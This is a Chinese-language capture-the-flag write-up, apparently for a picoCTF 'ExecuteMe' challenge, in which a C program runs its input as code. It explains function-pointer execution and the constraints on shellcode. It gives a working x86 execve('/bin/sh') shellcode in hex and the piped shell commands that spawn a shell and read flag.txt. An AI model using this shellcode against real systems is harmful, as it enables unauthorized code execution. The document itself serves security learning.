# ExecuteMe
這是一段會執行任何輸入字串的程式，看到程式碼：
```c
typedef void (*function_ptr)();
...
((function_ptr)buf)();
```
查了function pointer的用法：
 * 每個function包含code和指到code的function pointer
 * 而上面的程式碼是在告訴compiler，function_ptr的code從buf開始，所以compiler會把function pointer指到buf的開始位址
 * 但要注意到function指到的位置必須是**可執行的assembly byte code**

所以，能打開shell的assembly code必須符合以下條件：
 1. **不能包含\x0**，否則copy function會當作結束字元
 2. **執行輸入的code**：overwrite RET，相對位置 = 4(%esp)
 3. **猜中RET**：插入nop來增加成功率

想自己寫一個開啟shell的shellcode，但還沒成功，所以先用網路上其他人做的：
`\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68`
 1. 放入程式執行，因為是hex所以必須轉成字元，再用pipe傳給./execute
```bash
pico62895@shell:/home/execute$ (echo -e '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68') | ./execute
pico62895@shell:/home/execute$
```
 成功執行，但在我們能輸入其他指令前就結束了
 2. 所以使用cat讓他開著，並且會把結果印到terminal上：
```bash
pico62895@shell:/home/execute$ (echo -e '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'; cat) | ./execute
ls
Makefile   core       execute	 execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
```

成功取得flag。
